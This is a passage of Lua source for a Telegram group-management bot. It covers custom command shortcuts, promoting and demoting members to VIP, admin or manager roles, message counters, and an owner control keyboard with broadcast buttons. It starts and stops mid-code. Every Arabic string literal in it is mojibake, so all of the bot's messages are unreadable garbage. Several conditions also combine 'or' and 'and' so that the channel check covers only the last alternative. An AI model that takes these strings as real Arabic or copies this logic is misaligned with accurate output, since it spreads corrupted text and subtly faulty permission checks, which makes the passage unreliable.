if text == "Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" or text == "Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ±" or text == "ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
Devmfm:del(mustafa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
Devmfm:del(mustafa.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©", 1, 'html')
end
if text == "ΨͺΨ±ΨͺΩΨ¨ Ψ§ΩΨ§ΩΨ§ΩΨ±" then
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":Ψ§","Ψ§ΩΨ―Ω")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"Ψ§")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":ΨͺΩ","ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"ΨͺΩ")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":Ω","Ψ±ΩΨΉ ΩΩΩΨ²")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"Ω")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":Ψ§Ψ―","Ψ±ΩΨΉ Ψ§Ψ―ΩΩ")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"Ψ§Ψ―")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":ΩΨ―","Ψ±ΩΨΉ ΩΨ―ΩΨ±")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"ΩΨ―")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":ΩΩ","Ψ±ΩΨΉ ΩΩΨ΄Ψ¦")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"ΩΩ")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":Ψ§Ψ³","Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"Ψ§Ψ³")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":ΨͺΨΉΨ·","ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"ΨͺΨΉΨ·")
Devmfm:set(DevProx.."Set:Cmd:Group:New1"..msg.chat_id_..":ΨͺΩΨΉ","ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω")
Devmfm:sadd(DevProx.."List:Cmd:Group:New"..msg.chat_id_,"ΨͺΩΨΉ")
send(msg.chat_id_, msg.id_,"βοΈΨͺΩ ΨͺΨ±ΨͺΩΨ¨ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨ΄ΩΩ Ψ§ΩΨͺΨ§ΩΩ β« β€\nβ β β β β β β β β\nβοΈΨ§ΩΨ―Ω β« Ψ§\nβοΈΨͺΩΨ²ΩΩ Ψ§ΩΩΩ β« ΨͺΩ\nβοΈΨ±ΩΨΉ ΩΩΩΨ² β« Ω\nβοΈΨ±ΩΨΉ Ψ§Ψ―ΩΩ β« Ψ§Ψ― \nβοΈΨ±ΩΨΉ ΩΨ―ΩΨ± β« ΩΨ― \nβοΈΨ±ΩΨΉ ΩΩΨ΄Ψ¦ β« ΩΩ \nβοΈΨ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω β« Ψ§Ψ³  \nβοΈΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω β« ΨͺΨΉΨ·\nβοΈΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω β« ΨͺΩΨΉ\nβ β β β β β β β β")  
end
if text == "Ψ§ΨΆΩ Ψ§ΩΨ±" or text == "Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ±" or text == "Ψ§ΨΆΨ§ΩΩ Ψ§ΩΨ±" and ChCheck(msg) then
Devmfm:set(mustafa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―ΩΩ", 1, 'html')
return false
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ±" or text == "ΩΨ³Ψ­ Ψ§ΩΨ±" and ChCheck(msg) then 
Devmfm:set(mustafa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ°Ω ΩΩΨͺ Ψ¨Ψ§ΨΆΨ§ΩΨͺΩ ΩΨ―ΩΩΨ§", 1, 'html')
return false
end
end
--     Source Escobar     --
if text == "Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" or text == "Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ΨͺΩΨ¬Ψ― Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ ΩΨΆΨ§ΩΩ", 1, 'html')
return false
end
t = "β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ΅ΩΨ’Ψ­ΩΩΩ°Ψ’Ψͺ Ψ’ΩΩΩΨΆΨ’ΩΨ© β β₯‘ \nββββ EB ββββ\n"
for k,v in pairs(List) do
var = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." β’ ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" and ChCheck(msg) or text == "ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
Devmfm:del(mustafa.."Comd:New:rt:mfm:"..v..msg.chat_id_)
Devmfm:del(mustafa.."Coomds"..msg.chat_id_)
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ Ψ§ΩΩΨΆΨ§ΩΩ", 1, 'html')
end
end
if text and text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
Devmfm:set(mustafa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
Devmfm:sadd(mustafa.."Coomds"..msg.chat_id_,ComdNew)  
Devmfm:setex(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ \n{ ΨΉΨΆΩΩΩΩ β’ ΩΩΩΨ²  β’ Ψ§Ψ―ΩΩ  β’ ΩΨ―ΩΨ± }\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨΊΨ§Ψ‘ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ", 1, 'html')
end
if text and text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") or text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
Devmfm:del(mustafa.."Comd:New:rt:mfm:"..ComdNew..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ", 1, 'html')
end
if Devmfm:get(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±", 1, 'html')
Devmfm:del(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "ΩΨ―ΩΨ±" then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΨ© ( ΨΉΨΆΩΩΩΩ β’ ΩΩΩΨ²  β’ Ψ§Ψ―ΩΩ )\nβ β« Ψ§Ψ±Ψ³Ψ§Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω", 1, 'html')
return false
end
end
if text == "Ψ§Ψ―ΩΩ" then
if not Manager(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΨ© ( ΨΉΨΆΩΩΩΩ β’ ΩΩΩΨ² )\nβ β« Ψ§Ψ±Ψ³Ψ§Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω", 1, 'html')
return false
end
end
if text == "ΩΩΩΨ²" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΨ© ( ΨΉΨΆΩΩΩΩ )\nβ β« Ψ§Ψ±Ψ³Ψ§Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω", 1, 'html')
return false
end
end
if text == "ΩΨ―ΩΨ±" or text == "Ψ§Ψ―ΩΩ" or text == "ΩΩΩΨ²" or text == "ΨΉΨΆΩΩΩΩ" then
local textn = Devmfm:get(mustafa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
Devmfm:set(mustafa.."Comd:New:rt:mfm:"..textn..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ", 1, 'html')
Devmfm:del(mustafa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("Ψ±ΩΨΉ (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("Ψ±ΩΨΉ (.*)")
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..DEV_ABBAS..msg.chat_id_)
if mrmfm == "ΩΩΩΨ²" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "Ψ§Ψ―ΩΩ" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "ΩΨ―ΩΨ±" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrmfm == "ΨΉΨΆΩΩΩΩ" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("ΨͺΩΨ²ΩΩ (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("ΨͺΩΨ²ΩΩ (.*)")
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..DEV_ABBAS..msg.chat_id_)
if mrmfm == "ΩΩΩΨ²" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "Ψ§Ψ―ΩΩ" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "ΩΨ―ΩΨ±" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "ΨΉΨΆΩΩΩΩ" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..DEV_ABBAS..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^Ψ±ΩΨΉ (.*) @(.*)") then 
local text1 = {string.match(text, "^(Ψ±ΩΨΉ) (.*) @(.*)$")}
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..text1[2]..msg.chat_id_)
if mrmfm == "ΩΩΩΨ²" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "Ψ§Ψ―ΩΩ" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "ΩΨ―ΩΨ±" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "ΨΉΨΆΩΩΩΩ" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^ΨͺΩΨ²ΩΩ (.*) @(.*)") then 
local text1 = {string.match(text, "^(ΨͺΩΨ²ΩΩ) (.*) @(.*)$")}
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..text1[2]..msg.chat_id_)
if mrmfm == "ΩΩΩΨ²" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "Ψ§Ψ―ΩΩ" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "ΩΨ―ΩΨ±" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "ΨΉΨΆΩΩΩΩ" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β β¨ ['..result.title_..'](t.me/'..(text1[3] or 'TEAM_Escobar')..')'..' β©\nβ β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ β¨ '..text1[2]..' β© Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source Escobar     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
Devmfm:incr(mustafa..'mfm:UsersMsgs'..mustafa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:incr(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:incr(mustafa..'mfm:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not Devmfm:sismember(mustafa.."mfm:Users",msg.chat_id_) then
Devmfm:sadd(mustafa.."mfm:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source Escobar     --
if ChatType == 'pv' then 
if text == '/start' or text == 'Ψ±Ψ¬ΩΨΉ Ψπβ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'β β« ΩΨ±Ψ­Ψ¨Ψ§ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± \nβ β« Ψ§ΩΨͺ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΩΨ’ \nβ β« Ψ§ΩΩΩ Ψ§Ψ²Ψ±Ψ§Ψ± Ψ³ΩΨ±Ψ³ Ψ§Ψ³ΩΩΨ¨Ψ§Ψ± \nβ β« ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΩΨͺΨ­ΩΩ Ψ¨ΩΩ Ψ§ΩΨ§ΩΨ§ΩΨ± ΩΩΨ· Ψ§ΨΆΨΊΨ· ΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΨͺΩΩΩΩΩ°Ψ°Ω'
local key = {
{'ΩΨΆΨΉ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ','β ΨͺΨ­Ψ―ΩΨ« β','ΩΨΆΨΉ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±'},
{'β Ψ§ΩΩΨ·ΩΨ±ΩΩ β','β Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ β'},
{'β Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ β','Ψ±ΩΨ§Ψ¨Ψ· Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ','β Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β'},
{'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β','β ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β'},
{'ΨͺΩΨΈΩΩ Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ','β ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω β','ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ'},
{'β ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω β'},
{'ΨͺΨΉΨ·ΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ¨ΩΨͺ','ΨͺΩΨΉΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ¨ΩΨͺ'},
{'β ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ β'},
{'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω β','β ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω β'},
{'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ β','β ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ β'},
{'β Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ β'},
{'β Ψ§Ψ°Ψ§ΨΉΩ ΨΉΨ§Ω β','β Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ β'},
{'β Ψ§Ψ°Ψ§ΨΉΩ ΨΉΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ β','β Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ β'},
{'~ ΨͺΨΉΩΩΩ ΩΩΨ§ΩΨ΄ Ψ§ΩΨ§ΩΨ§ΩΨ± ~'},
